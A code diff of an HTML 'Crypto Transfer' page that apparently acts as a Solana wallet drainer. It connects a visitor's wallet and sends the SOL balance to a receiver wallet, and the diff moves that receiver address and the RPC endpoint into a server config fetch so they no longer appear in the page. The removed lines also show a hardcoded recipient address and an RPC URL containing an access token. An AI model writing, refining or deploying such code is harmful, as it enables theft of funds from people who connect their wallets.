@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.41.4/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.41.4/solanaWeb3.min.js"></script>
 </head>
 <body>
     <h1>Click below to transfer all funds</h1>
@@ -24,15 +24,24 @@
                     throw new Error('Failed to get public key.');
                 }
 
-                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');
+                // Fetch recipient and RPC URL from server
+                const response = await fetch('/api/config');
+                const config = await response.json();
+                const rpcUrl = config.rpcUrl;
+                const recipient = config.receiverWallet;
+
+                if (!rpcUrl || !recipient) {
+                    throw new Error('Missing configuration. Please check your server setup.');
+                }
+
+                const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                 const balance = await connection.getBalance(publicKey);
-                
-                if (balance <= 0) {
+
+                if (balance <= 5000) { // Ensure enough for transaction fee
                     alert('Insufficient SOL balance.');
                     return;
                 }
 
-                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
@@ -49,8 +58,9 @@
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 await connection.confirmTransaction(signature);
 
-                alert(`Transaction successful: ${signature}`);
+                alert(`Transaction successful! Signature: ${signature}`);
             } catch (error) {
+                console.error('Transaction Error:', error);
                 alert(`Transaction failed: ${error.message}`);
             }
         });
